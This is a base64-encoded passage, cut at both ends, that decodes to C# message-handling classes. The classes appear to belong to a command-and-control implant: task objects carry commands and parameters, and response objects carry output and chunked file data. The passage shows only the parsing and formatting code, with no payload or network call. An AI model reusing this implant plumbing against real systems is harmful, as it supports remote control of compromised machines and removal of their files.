wMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIFBvc3RSZXNwb25zZVJlc3BvbnNlIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBQb3N0UmVzcG9uc2VSZXNwb25zZS5QYXJzZShtZXNzYWdlLCBQb3N0UmVzcG9uc2VSZXNwb25zZUZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDIpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBvc3RSZXNwb25zZVJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcyA9IFJlc3BvbnNlLlBhcnNlUmVzcG9uc2VzKHBhcnNlTGlzdFsxXSkNCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFRhc2sgDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY29tbWFuZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHBhcmFtZXRlcnMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBpZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRpbWVzdGFtcCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRhc2tGb3JtYXQgPSBAInt7IiJjb21tYW5kIiI6ICIiezB9IiIsICIicGFyYW1ldGVycyIiOiAiInt7ezF9fX0iIiwgIiJpZCIiOiAiInsyfSIiLCAiInRpbWVzdGFtcCIiOiB7M319fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsICJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsyfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7Mn0iLCAiKD8nZ3JvdXAyJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezN9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInszfSIsICIoPydncm91cDMnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEpOw0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBtYXRjaGVzID0gbmV3IExpc3Q8c3RyaW5nPigpOw0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMCJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDAiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDEiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMiJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMyJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDMiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PFRhc2s+IFBhcnNlVGFza3Moc3RyaW5nIHRhc2tzX2pzb24pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHRhc2tzX2pzb24gPT0gIltdIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrc19qc29uID0gdGFza3NfanNvbi5SZXBsYWNlKCJbIiwgQCIiKS5SZXBsYWNlKCJdIiwgQCIiKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgTGlzdDxUYXNrPiB0YXNrcyA9IG5ldyBMaXN0PFRhc2s+KCk7DQogICAgICAgICAgICAgICAgc3RyaW5nW10gdGFza3Nfc3BsaXQgPSB0YXNrc19qc29uLlNwbGl0KG5ld1tdIHsgIn0sIiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuUmVtb3ZlRW1wdHlFbnRyaWVzKTsNCiAgICAgICAgICAgICAgICBpbnQgY291bnQgPSAwOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKHN0cmluZyB0YXNrIGluIHRhc2tzX3NwbGl0KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IG5ldyBMaXN0PHN0cmluZz4geyB9Ow0KICAgICAgICAgICAgICAgICAgICBpZiAoY291bnQgKyAxICE9IHRhc2tzX3NwbGl0Lkxlbmd0aCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gVGFzay5QYXJzZSh0YXNrICsgIn0iLCBUYXNrRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdFswXSA9PSAiIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgZm9ybWF0ID0gQCJ7eyIiY29tbWFuZCIiOiAiInswfSIiLCAiInBhcmFtZXRlcnMiIjogIiJ7MX0iIiwgIiJpZCIiOiAiInsyfSIiLCAiInRpbWVzdGFtcCIiOiB7M319fSI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2VMaXN0ID0gVGFzay5QYXJzZSh0YXNrLCBmb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBUYXNrLlBhcnNlKHRhc2sgKyAifSIsIFRhc2tGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0WzBdID09ICIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBmb3JtYXQgPSBAInt7IiJjb21tYW5kIiI6ICIiezB9IiIsICIicGFyYW1ldGVycyIiOiAiInsxfSIiLCAiImlkIiI6ICIiezJ9IiIsICIidGltZXN0YW1wIiI6IHszfX19IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBUYXNrLlBhcnNlKHRhc2ssIGZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDQpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICAgICAgVGFzayBuZXdfdGFzayA9IG5ldyBUYXNrDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICBwYXJhbWV0ZXJzID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICAgICAgaWQgPSBwYXJzZUxpc3RbMl0sDQogICAgICAgICAgICAgICAgICAgICAgICB0aW1lc3RhbXAgPSBwYXJzZUxpc3RbM10NCiAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgdGFza3MuQWRkKG5ld190YXNrKTsNCiAgICAgICAgICAgICAgICAgICAgKytjb3VudDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRhc2tzOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFRhc2tSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRhc2tfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB1c2VyX291dHB1dCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHN0YXR1cyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGNvbXBsZXRlZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGVycm9yIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQ\/IHRvdGFsX2NodW5rcyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGZ1bGxfcGF0aCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50PyBjaHVua19udW0geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBjaHVua19kYXRhIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZmlsZV9pZCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siInRhc2tfaWQiIjoiInswfSIiLCIidXNlcl9vdXRwdXQiIjoiInsxfSIiLCIic3RhdHVzIiI6IiJ7Mn0iIiwiImNvbXBsZXRlZCIiOnszfSwiImVycm9yIiI6IiJ7NH0iIiwiInRvdGFsX2NodW5rcyIiOns1fSwiImZ1bGxfcGF0aCIiOiIiezZ9IiIsIiJjaHVua19udW0iIjp7N30sIiJjaHVua19kYXRhIiI6IiJ7OH0iIiwiImZpbGVfaWQiIjoiIns5fSIifX0iOw0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0MSA9IEAie3siInRhc2tfaWQiIjoiInswfSIiLCIidXNlcl9vdXRwdXQiIjoiInsxfSIiLCIic3RhdHVzIiI6IiJ7Mn0iIiwiImNvbXBsZXRlZCIiOiIiezN9IiIsIiJlcnJvciIiOiIiezR9IiIsIiJ0b3RhbF9jaHVua3MiIjoiIns1fSIiLCIiZnVsbF9wYXRoIiI6IiJ7Nn0iIiwiImNodW5rX251bSIiOns3fSwiImNodW5rX2RhdGEiIjoiIns4fSIiLCIiZmlsZV9pZCIiOiIiezl9IiJ9fSI7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQyID0gQCJ7eyIidGFza19pZCIiOiIiezB9IiIsIiJ1c2VyX291dHB1dCIiOiIiezF9IiIsIiJzdGF0dXMiIjoiInsyfSIiLCIiY29tcGxldGVkIiI6IiJ7M30iIiwiImVycm9yIiI6IiJ7NH0iIiwiInRvdGFsX2NodW5rcyIiOns1fSwiImZ1bGxfcGF0aCIiOiIiezZ9IiIsIiJjaHVua19udW0iIjoiIns3fSIiLCIiY2h1bmtfZGF0YSIiOiIiezh9IiIsIiJmaWxlX2lkIiI6IiJ7OX0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdDMgPSBAInt7IiJ0YXNrX2lkIiI6IiJ7MH0iIiwiInVzZXJfb3V0cHV0IiI6IiJ7MX0iIiwiInN0YXR1cyIiOiIiezJ9IiIsIiJjb21wbGV0ZWQiIjoiInszfSIiLCIiZXJyb3IiIjoiIns0fSIiLCIidG90YWxfY2h1bmtzIiI6IiJ7NX0iIiwiImZ1bGxfcGF0aCIiOiIiezZ9IiIsIiJjaHVua19udW0iIjoiIns3fSIiLCIiY2h1bmtfZGF0YSIiOiIiezh9IiIsIiJmaWxlX2lkIiI6IiJ7OX0iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVG9Kc29uKFRhc2tSZXNwb25zZSB0YXNrX3Jlc3BvbnNlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZyBGb3JtYXQgPSB0YXNrX3Jlc3BvbnNlLkpzb25Gb3JtYXQ7DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UudXNlcl9vdXRwdXQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2UudXNlcl9vdXRwdXQgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UuY29tcGxldGVkID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLmNvbXBsZXRlZCA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5lcnJvciA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS5lcnJvciA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5zdGF0dXMgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2Uuc3RhdHVzID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHN0cmluZyB0b3RhbF9jaHVua3M7DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UudG90YWxfY2h1bmtzID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBGb3JtYXQgPSB0YXNrX3Jlc3BvbnNlLkpzb25Gb3JtYXQxOw0KICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgRm9ybWF0ID0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0MjsNCiAgICAgICAgICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gdGFza19yZXNwb25zZS50b3RhbF9jaHVua3MuVG9TdHJpbmcoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UuZnVsbF9wYXRoID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLmZ1bGxfcGF0aCA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBzdHJpbmcgY2h1bmtfbnVtOw0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLmNodW5rX251bSA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKEZvcm1hdCAhPSB0YXNrX3Jlc3BvbnNlLkpzb25Gb3JtYXQyKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBGb3JtYXQgPSB0YXNrX3Jlc3BvbnNlLkpzb25Gb3JtYXQzOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGNodW5rX251bSA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoRm9ybWF0ICE9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDE7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gdGFza19yZXNwb25zZS5jaHVua19udW0uVG9TdHJpbmcoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UuY2h1bmtfZGF0YSA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS5jaHVua19kYXRhID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLmZpbGVfaWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2UuZmlsZV9pZCA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgRm9ybWF0LA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRhc2tfcmVzcG9uc2UudGFza19pZCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS51c2VyX291dHB1dCksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5zdGF0dXMpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRhc2tfcmVzcG9uc2UuY29tcGxldGVkKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLmVycm9yKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0b3RhbF9jaHVua3MpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRhc2tfcmVzcG9uc2UuZnVsbF9wYXRoKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShjaHVua19udW0pLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRhc2tfcmVzcG9uc2UuY2h1bmtfZGF0YSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5maWxlX2lkKQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgUmVzcG9uc2UNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0YXNrX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc3RhdHVzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZXJyb3IgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmaWxlX2lkIHsgZ2V0OyBzZXQ7fQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBSZXNwb25zZVN1Y2Nlc3NGb3JtYXQgPSBAInt7IiJzdGF0dXMiIjogIiJ7MH0iIiwgIiJ0YXNrX2lkIiI6ICIiezF9IiJ9fSI7DQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBSZXNwb25zZUVycm9yRm9ybWF0ID0gQCJ7eyIic3RhdHVzIiI6ICIiezB9IiIsICIidGFza19pZCIiOiAiInsxfSIiLCAiImVycm9yIiI6ICIiezJ9IiJ9fSI7DQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBSZXNwb25zZURvd25sb2FkRm9ybWF0ID0gQCJ7eyIic3RhdHVzIiI6ICIiezB9IiIsICIidGFza19pZCIiOiAiInsxfSIiLCAiImZpbGVfaWQiIjogIiJ7Mn0iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2VTdWNjZXNzKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsICJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2VFcnJvcihzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxSZXNwb25zZT4gUGFyc2VSZXNwb25zZXMoc3RyaW5nIHJlc3BvbnNlc19qc29uKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZXNfanNvbiA9PSAiW10iKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlc19qc29uID0gcmVzcG9uc2VzX2pzb24uUmVwbGFjZSgiWyIsIEAiIikuUmVwbGFjZSgiXSIsIEAiIik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIExpc3Q8UmVzcG9uc2U+IHJlc3BvbnNlcyA9IG5ldyBMaXN0PFJlc3BvbnNlPigpOw0KICAgICAgICAgICAgICAgIHN0cmluZ1tdIHJlc3BvbnNlc19zcGxpdCA9IHJlc3BvbnNlc19qc29uLlNwbGl0KG5ld1tdIHsgIn0sIiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuUmVtb3ZlRW1wdHlFbnRyaWVzKTsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChzdHJpbmcgcmVzcG9uc2UgaW4gcmVzcG9uc2VzX3NwbGl0KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IG5ldyBMaXN0PHN0cmluZz4geyB9Ow0KICAgICAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2UuQ29udGFpbnMoImVycm9yIikpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFJlc3BvbnNlLlBhcnNlRXJyb3IocmVzcG9uc2UsIFJlc3BvbnNlRXJyb3JGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0L